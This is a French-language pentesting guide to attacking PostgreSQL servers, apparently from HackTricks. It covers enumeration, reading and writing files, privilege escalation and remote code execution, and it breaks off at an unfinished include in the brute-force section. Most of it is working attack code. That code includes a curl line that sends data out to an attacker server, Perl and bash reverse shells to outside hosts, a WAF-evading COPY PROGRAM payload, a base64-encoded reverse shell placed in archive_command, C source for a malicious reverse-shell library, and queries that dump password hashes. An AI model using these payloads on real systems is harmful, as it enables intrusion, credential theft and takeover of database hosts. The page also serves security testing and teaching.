# 5432,5433 - Pentesting Postgresql

{{#include ../banners/hacktricks-training.md}}

## **Informations de base**

**PostgreSQL** est décrit comme un **système de gestion de base de données objet-relationnel** qui est **open source**. Ce système n'utilise pas seulement le langage SQL, il l'enrichit également avec des fonctionnalités supplémentaires. Ses capacités lui permettent de gérer un large éventail de types de données et d'opérations, ce qui en fait un choix polyvalent pour les développeurs et les organisations.

**Port par défaut :** 5432, et si ce port est déjà utilisé il semble que postgresql utilisera le port suivant (probablement 5433) qui n'est pas utilisé.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Connexion & énumération de base
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Si en exécutant **`\list`** vous trouvez une base de données appelée **`rdsadmin`**, vous savez que vous êtes dans une base de données **AWS postgresql**.

Pour plus d'informations sur **comment abuser d'une base de données PostgreSQL** consultez :


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Énumération automatique
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port scanning**

Selon [**this research**](https://www.exploit-db.com/papers/13084), lorsqu'une tentative de connexion échoue, `dblink` lance une exception `sqlclient_unable_to_establish_sqlconnection` incluant une explication de l'erreur. Des exemples de ces détails sont listés ci-dessous.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Hôte hors ligne

`DETAIL: could not connect to server: No route to host Is the server running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?`

- Port fermé
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port est ouvert
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ou
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port ouvert ou filtré
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
Dans les fonctions PL/pgSQL, il n'est actuellement pas possible d'obtenir les détails des exceptions. Cependant, si vous avez un accès direct au serveur PostgreSQL, vous pouvez récupérer les informations nécessaires. Si l'extraction des usernames et passwords depuis les tables système n'est pas faisable, vous pouvez envisager d'utiliser la méthode d'attaque par wordlist discutée dans la section précédente, car elle pourrait donner des résultats positifs.

## Énumération des privilèges

### Rôles

| Types de rôle |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Le rôle dispose de privilèges de superuser                                                                                                          |
| rolinherit     | Le rôle hérite automatiquement des privilèges des rôles dont il est membre                                                                          |
| rolcreaterole  | Le rôle peut créer d'autres rôles                                                                                                                   |
| rolcreatedb    | Le rôle peut créer des bases de données                                                                                                             |
| rolcanlogin    | Le rôle peut se connecter. Autrement dit, ce rôle peut être donné comme identifiant d'autorisation de session initiale                               |
| rolreplication | Le rôle est un rôle de réplication. Un rôle de réplication peut initier des connexions de réplication et créer/supprimer des replication slots.        |
| rolconnlimit   | Pour les rôles pouvant se connecter, ceci définit le nombre maximal de connexions simultanées que ce rôle peut établir. -1 signifie aucune limite.  |
| rolpassword    | Pas le password (s'affiche toujours comme `********`)                                                                                                 |
| rolvaliduntil  | Password expiry time (utilisé uniquement pour l'authentification par password) ; null si pas d'expiration                                           |
| rolbypassrls   | Le rôle contourne toutes les politiques de row-level security, see [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) for more information. |
| rolconfig      | Paramètres par défaut spécifiques au rôle pour les variables de configuration au run-time                                                           |
| oid            | ID du rôle                                                                                                                                           |

#### Groupes intéressants

- Si vous êtes membre de **`pg_execute_server_program`** vous pouvez **exécuter** des programmes
- Si vous êtes membre de **`pg_read_server_files`** vous pouvez **lire** des fichiers
- Si vous êtes membre de **`pg_write_server_files`** vous pouvez **écrire** des fichiers

> [!TIP]
> Notez que dans Postgres un **user**, un **group** et un **role** sont **identiques**. Cela dépend simplement de **la façon dont vous les utilisez** et si vous **autorisez leur login**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tables
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonctions
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## File-system actions

### Read directories and files

À partir de ce [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) les membres du groupe défini **`DEFAULT_ROLE_READ_SERVER_FILES`** (appelé **`pg_read_server_files`**) et les **super users** peuvent utiliser la méthode **`COPY`** sur n'importe quel chemin (consultez `convert_and_check_filename` dans `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> N'oubliez pas que si vous n'êtes pas superuser mais que vous avez la permission **CREATEROLE** vous pouvez **vous ajouter comme membre de ce groupe :**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Il existe **d'autres fonctions postgres** qui peuvent être utilisées pour **lire un fichier ou lister un répertoire**. Seuls les **superusers** et les **utilisateurs ayant des permissions explicites** peuvent les utiliser :
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Vous pouvez trouver **plus de fonctions** dans [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Écriture simple de fichiers

Seuls **super users** et les membres de **`pg_write_server_files`** peuvent utiliser copy pour écrire des fichiers.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> N'oubliez pas que si vous n'êtes pas superutilisateur mais que vous avez la permission **`CREATEROLE`**, vous pouvez **vous ajouter comme membre de ce groupe :**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

N'oubliez pas que COPY ne peut pas gérer les caractères de nouvelle ligne, donc même si vous utilisez une charge utile base64 **vous devez envoyer une seule ligne**.\
Une limitation très importante de cette technique est que **`copy` ne peut pas être utilisé pour écrire des fichiers binaires car il modifie certaines valeurs binaires.**

### **Téléversement de fichiers binaires**

Cependant, il existe **d'autres techniques pour téléverser de gros fichiers binaires :**


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Mise à jour des données de table PostgreSQL via écriture locale de fichier

Si vous disposez des permissions nécessaires pour lire et écrire les fichiers du serveur PostgreSQL, vous pouvez mettre à jour n'importe quelle table du serveur en **écrasant le filenode associé** dans [le PostgreSQL data directory](https://www.postgresql.org/docs/8.1/storage.html). **Plus d'informations sur cette technique** [**ici**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Étapes requises :

1.  Obtenir le PostgreSQL data directory

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Remarque :** Si vous n'arrivez pas à récupérer le chemin du répertoire de données actuel depuis les paramètres, vous pouvez interroger la version majeure de PostgreSQL via la requête `SELECT version()` et essayer de brute-forcer le chemin. Les chemins de répertoire de données courants sur les installations Unix de PostgreSQL sont `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Un nom de cluster courant est `main`.

2.  Obtenir un chemin relatif vers le filenode associé à la table cible

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Cette requête devrait retourner quelque chose comme `base/3/1337`. Le chemin complet sur le disque sera `$DATA_DIRECTORY/base/3/1337`, c.-à-d. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Télécharger le filenode via les fonctions `lo_*`

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Obtenir le datatype associé à la table cible

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Utilisez le [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) pour [éditer le filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users) ; définissez tous les drapeaux booléens `rol*` à 1 pour accorder les permissions complètes.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ré-uploader le filenode édité via les fonctions `lo_*`, et écrasez le fichier original sur le disque

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Optionnel)_ Vider le cache de table en mémoire en exécutant une requête SQL coûteuse

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Vous devriez maintenant voir les valeurs de la table mises à jour dans PostgreSQL.

Vous pouvez aussi devenir superadmin en modifiant la table `pg_authid`. **Voir** [**la section suivante**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE vers un programme**

Depuis [la version 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), seuls les **superutilisateurs** et les membres du groupe **`pg_execute_server_program`** peuvent utiliser copy pour RCE (exemple avec exfiltration:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Exemple à exécuter :
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Rappelez-vous que si vous n'êtes pas super-utilisateur mais que vous disposez de la permission **`CREATEROLE`**, vous pouvez **vous ajouter à ce groupe :**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**More info.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ou utilisez le module `multi/postgres/postgres_copy_from_program_cmd_exec` de **metasploit**.\
Plus d'informations sur cette vulnérabilité [**ici**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Bien que signalée comme CVE-2019-9193, Postgres a déclaré qu'il s'agissait d'une [fonctionnalité et ne sera pas corrigée](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

#### Contourner les filtres de mots-clés/WAF pour atteindre COPY PROGRAM

Dans des contextes SQLi avec des requêtes empilées, un WAF peut supprimer ou bloquer le mot-clé littéral `COPY`. Vous pouvez construire dynamiquement l'instruction et l'exécuter à l'intérieur d'un bloc DO PL/pgSQL. Par exemple, construisez le C initial avec `CHR(67)` pour contourner des filtres naïfs et EXECUTE la commande assemblée:
```sql
DO $$
DECLARE cmd text;
BEGIN
cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"''';
EXECUTE cmd;
END $$;
```
Ce schéma évite le filtrage statique de mots-clés tout en permettant l'exécution de commandes OS via `COPY ... PROGRAM`. Il est particulièrement utile quand l'application renvoie les erreurs SQL et autorise les requêtes empilées.

### RCE avec les langages PostgreSQL


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE avec les extensions PostgreSQL

Une fois que vous avez **appris** dans le post précédent **comment uploader des fichiers binaires**, vous pouvez essayer d'obtenir **RCE en téléversant une extension postgresql et en la chargeant**.


{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE via le fichier de configuration PostgreSQL

> [!TIP]
> Les vecteurs RCE suivants sont particulièrement utiles dans des contextes SQLi contraints, car toutes les étapes peuvent être effectuées via des SELECT imbriqués

Le **fichier de configuration** de PostgreSQL est **modifiable** par l'**utilisateur postgres**, qui exécute la base de données ; en tant que **superuser**, il est possible d'écrire des fichiers sur le système de fichiers, et donc d'**écraser ce fichier.**

![](<../images/image (322).png>)

#### **RCE with ssl_passphrase_command**

Plus d'informations [sur cette technique ici](https://pulsesecurity.co.nz/articles/postgres-sqli).

Le fichier de configuration contient quelques attributs intéressants pouvant mener à une RCE :

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Chemin vers la clé privée de la base de données
- `ssl_passphrase_command = ''` Si le fichier privé est protégé par mot de passe (chiffré) PostgreSQL va **exécuter la commande indiquée dans cet attribut**.
- `ssl_passphrase_command_supports_reload = off` **Si** cet attribut est **activé**, la **commande** (lorsque la clé est protégée par mot de passe) **sera exécutée** quand `pg_reload_conf()` est **appelé**.

Ensuite, un attaquant devra :

1. **Dumper la clé privée** depuis le serveur
2. **Chiffrer** la clé privée téléchargée :
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Écraser**
4. **Dumper** la **configuration** actuelle de postgresql
5. **Écraser** la **configuration** avec les attributs mentionnés :
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Exécuter `pg_reload_conf()`

Lors des tests, j'ai remarqué que cela ne fonctionne que si le **fichier de clé privée a les permissions 640**, qu'il est **propriété de root** et du **groupe ssl-cert ou postgres** (pour que l'utilisateur postgres puisse le lire), et qu'il est placé dans _/var/lib/postgresql/12/main_.

#### **RCE with archive_command**

**Plus** [**d'informations sur cette config et sur le WAL ici**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Un autre attribut exploitable du fichier de configuration est `archive_command`.

Pour que cela fonctionne, le réglage `archive_mode` doit être `'on'` ou `'always'`. Si c'est le cas, on peut écraser la commande dans `archive_command` et la forcer à s'exécuter via les opérations WAL (write-ahead logging).

Les étapes générales sont :

1. Vérifier si archive mode est activé : `SELECT current_setting('archive_mode')`
2. Écraser `archive_command` avec le payload. Par ex., un reverse shell : `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RETU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Recharger la config : `SELECT pg_reload_conf()`
4. Forcer une opération WAL pour appeler la archive command : `SELECT pg_switch_wal()` ou `SELECT pg_switch_xlog()` selon les versions de Postgres

##### Editing postgresql.conf via Large Objects (SQLi-friendly)

Lorsque des écritures multi-lignes sont nécessaires (p.ex. pour définir plusieurs GUC), utilisez les PostgreSQL Large Objects pour lire et écraser la config entièrement depuis SQL. Cette méthode est idéale dans des contextes SQLi où `COPY` ne gère pas les sauts de ligne ou les écritures binaires sûres.

Exemple (ajustez la version majeure et le chemin si nécessaire, p.ex. version 15 sur Debian) :
```sql
-- 1) Import the current configuration and note the returned OID (example OID: 114575)
SELECT lo_import('/etc/postgresql/15/main/postgresql.conf');

-- 2) Read it back as text to verify
SELECT encode(lo_get(114575), 'escape');

-- 3) Prepare a minimal config snippet locally that forces execution via WAL
--    and base64-encode its contents, for example:
--    archive_mode = 'always'\n
--    archive_command = 'bash -c "bash -i >& /dev/tcp/10.10.14.8/443 0>&1"'\n
--    archive_timeout = 1\n
--    Then write the new contents into a new Large Object and export it over the original file
SELECT lo_from_bytea(223, decode('<BASE64_POSTGRESQL_CONF>', 'base64'));
SELECT lo_export(223, '/etc/postgresql/15/main/postgresql.conf');

-- 4) Reload the configuration and optionally trigger a WAL switch
SELECT pg_reload_conf();
-- Optional explicit trigger if needed
SELECT pg_switch_wal();  -- or pg_switch_xlog() on older versions
```
Cela permet une exécution fiable de commandes OS via `archive_command` en tant qu'utilisateur `postgres`, à condition que `archive_mode` soit activé. En pratique, définir un `archive_timeout` faible peut provoquer des invocations rapides sans nécessiter un WAL switch explicite.

#### **RCE with preload libraries**

More information [about this technique here](https://adeadfed.com/posts/postgresql-select-only-rce/).

This attack vector takes advantage of the following configuration variables:

- `session_preload_libraries` -- libraries that will be loaded by the PostgreSQL server at the client connection.
- `dynamic_library_path` -- list of directories where the PostgreSQL server will search for the libraries.

We can set the `dynamic_library_path` value to a directory, writable by the `postgres` user running the database, e.g., `/tmp/` directory, and upload a malicious `.so` object there. Next, we will force the PostgreSQL server to load our newly uploaded library by including it in the `session_preload_libraries` variable.

The attack steps are:

1. Télécharger le fichier original `postgresql.conf`
2. Inclure le répertoire `/tmp/` dans la valeur de `dynamic_library_path`, par ex. `dynamic_library_path = '/tmp:$libdir'`
3. Inclure le nom de la librairie malveillante dans la valeur de `session_preload_libraries`, par ex. `session_preload_libraries = 'payload.so'`
4. Vérifier la version majeure de PostgreSQL via la requête `SELECT version()`
5. Compiler le code de la librairie malveillante avec le bon package dev PostgreSQL. Exemple de code:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Compiling the code:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Téléverser le `postgresql.conf` malveillant créé aux étapes 2-3 et écraser l'original
7. Téléverser le `payload.so` de l'étape 5 dans le répertoire `/tmp`
8. Recharger la configuration du serveur en redémarrant le serveur ou en exécutant la requête `SELECT pg_reload_conf()`
9. À la prochaine connexion à la DB, vous obtiendrez une reverse shell.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

According to the [**docs**](https://www.postgresql.org/docs/13/sql-grant.html): _Roles having **`CREATEROLE`** privilege can **grant or revoke membership in any role** that is **not** a **superuser**._

Donc, si vous disposez de la permission **`CREATEROLE`**, vous pouvez vous accorder l'accès à d'autres **rôles** (qui ne sont pas superuser) pouvant vous permettre de lire et écrire des fichiers et d'exécuter des commandes :
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Modifier les mots de passe

Les utilisateurs ayant ce rôle peuvent également **changer** les **mots de passe** d'autres **non-superusers**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Il est assez courant de constater que **les utilisateurs locaux peuvent se connecter à PostgreSQL sans fournir de mot de passe**. Par conséquent, une fois que vous avez obtenu **des permissions pour exécuter du code** vous pouvez abuser de ces permissions pour vous accorder le rôle **`SUPERUSER`** :
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!TIP]
> Ceci est généralement possible à cause des lignes suivantes dans le fichier **`pg_hba.conf`** :
>
> ```bash
> # "local" is for Unix domain socket connections only
> local   all             all                                     trust
> # IPv4 local connections:
> host    all             all             127.0.0.1/32            trust
> # IPv6 local connections:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

In [**this writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) est expliqué comment il a été possible de **privesc** dans Postgres GCP en abusant du privilège ALTER TABLE qui avait été accordé à l'utilisateur.

When you try to **make another user owner of a table** you should get an **error** preventing it, but apparently GCP gave that **option to the not-superuser postgres user** in GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

En joignant cette idée au fait que lorsque les commandes **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) sont exécutées sur une **table with an index function**, la **function** est **appelée** dans le cadre de la commande avec les **permissions du propriétaire** de la **table**. Il est possible de créer un index avec une fonction et d'attribuer les permissions de propriétaire à un **super user** sur cette table, puis d'exécuter ANALYZE sur la table avec la fonction malveillante qui pourra exécuter des commandes parce qu'elle utilise les privilèges du propriétaire.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Commencez par créer une nouvelle table.
2. Insérez du contenu non pertinent dans la table pour fournir des données à la fonction d'index.
3. Développez une fonction d'index malveillante contenant une charge utile d'exécution de code, permettant l'exécution de commandes non autorisées.
4. Effectuez un ALTER du propriétaire de la table pour le définir sur "cloudsqladmin", qui est le rôle superutilisateur de GCP utilisé exclusivement par Cloud SQL pour gérer et maintenir la base de données.
5. Effectuez une opération ANALYZE sur la table. Cette action contraint le moteur PostgreSQL à basculer vers le contexte utilisateur du propriétaire de la table, "cloudsqladmin". Par conséquent, la fonction d'index malveillante est appelée avec les permissions de "cloudsqladmin", permettant ainsi l'exécution de la commande shell précédemment non autorisée.

Dans PostgreSQL, ce flux ressemble à ceci :
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Ensuite, la table `shell_commands_results` contiendra la sortie du code exécuté :
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Connexion locale

Certaines instances postgresql mal configurées peuvent permettre la connexion de n'importe quel utilisateur local. Il est possible de se connecter depuis 127.0.0.1 en utilisant la **`dblink` fonction** :
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Notez que pour que la requête précédente fonctionne **la fonction `dblink` doit exister**. Si elle n'existe pas, vous pouvez essayer de la créer avec
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Si vous avez le mot de passe d'un utilisateur disposant de plus de privilèges, mais que cet utilisateur n'est pas autorisé à se connecter depuis une IP externe, vous pouvez utiliser la fonction suivante pour exécuter des requêtes en tant que cet utilisateur :
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Il est possible de vérifier si cette fonction existe avec :
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Fonction personnalisée avec** SECURITY DEFINER

[**In this writeup**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesters ont pu privesc dans une instance postgres fournie par IBM, car ils **ont trouvé cette fonction avec le flag SECURITY DEFINER** :

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

As [**explained in the docs**](https://www.postgresql.org/docs/current/sql-createfunction.html) une fonction avec **SECURITY DEFINER is executed** avec les privilèges de l'**user that owns it**. Par conséquent, si la fonction est **vulnerable to SQL Injection** ou effectue des **privileged actions with params controlled by the attacker**, elle pourrait être abusée pour **escalate privileges inside postgres**.

À la ligne 4 du code précédent, on peut voir que la fonction a le flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
Et ensuite **exécuter des commandes** :

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Brute-force de mots de passe avec PL/pgSQL

**PL/pgSQL** est un **langage de programmation complet** qui offre un contrôle procédural supérieur par rapport à SQL. Il permet l'utilisation de **boucles** et d'autres **structures de contrôle** pour améliorer la logique du programme. De plus, les **SQL statements** et les **triggers** peuvent invoquer des fonctions créées avec le **langage PL/pgSQL**. Cette intégration permet une approche plus complète et polyvalente de la programmation et de l'automatisation des bases de données.\
**Vous pouvez abuser de ce langage pour demander à PostgreSQL de brute-force les identifiants des utilisateurs.**


{{#ref}}
